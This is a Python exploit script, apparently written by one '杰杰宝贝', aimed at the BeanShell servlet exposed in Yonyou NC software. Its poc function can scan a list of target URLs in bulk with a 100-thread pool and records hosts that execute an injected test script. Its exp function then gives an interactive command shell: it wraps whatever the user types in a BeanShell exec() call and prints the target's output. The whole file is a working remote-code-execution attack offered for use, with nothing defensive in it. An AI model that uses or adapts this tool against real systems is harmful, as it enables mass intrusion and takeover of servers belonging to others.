import requests,sys,argparse,json,re,time,os
from multiprocessing.dummy import Pool
from requests.packages import urllib3
urllib3.disable_warnings()
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='用友NC_poc')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url) :
            exp(args.url)
    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api_payload = "/servlet/~ic/bsh.servlet.BshServlet"
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'bsh.script=print("chengsiyuan!");'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+api_payload,headers=headers,verify=False,timeout=15)
        if res1.status_code == 200:
            res2 = requests.post(url=target+api_payload,headers=headers,data=data,proxies=proxies)
            # print(res2.text)
            match = re.findall(r'<pre>(.*?)</pre>',res2.text,re.S)
            # print(match)
            for i in match:
                if 'chengsiyuan' in i.strip():
                    with open('result.txt','a') as fp:
                        fp.write(target+'\n')
                    return True
    except:
        pass
def exp(target):
    try:
        api_payload = "/servlet/~ic/bsh.servlet.BshServlet"
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        print("正在努力给你搞一个shell...")
        time.sleep(2)
        os.system("cls")
        while True :
            cmd = input("请输入你要输入的命令：输入q退出")
            if cmd == 'q':
                exit();
            data = 'bsh.script=exec("'+cmd+'");'
            res = requests.post(url=target+api_payload,headers=headers,data=data,verify=False)
            macth = re.findall(f'<pre>(.*?)</pre>',res.text,re.S)[0]
            print(macth)
    except:
        print("你输入的代码不对")


if __name__ == '__main__':
    main()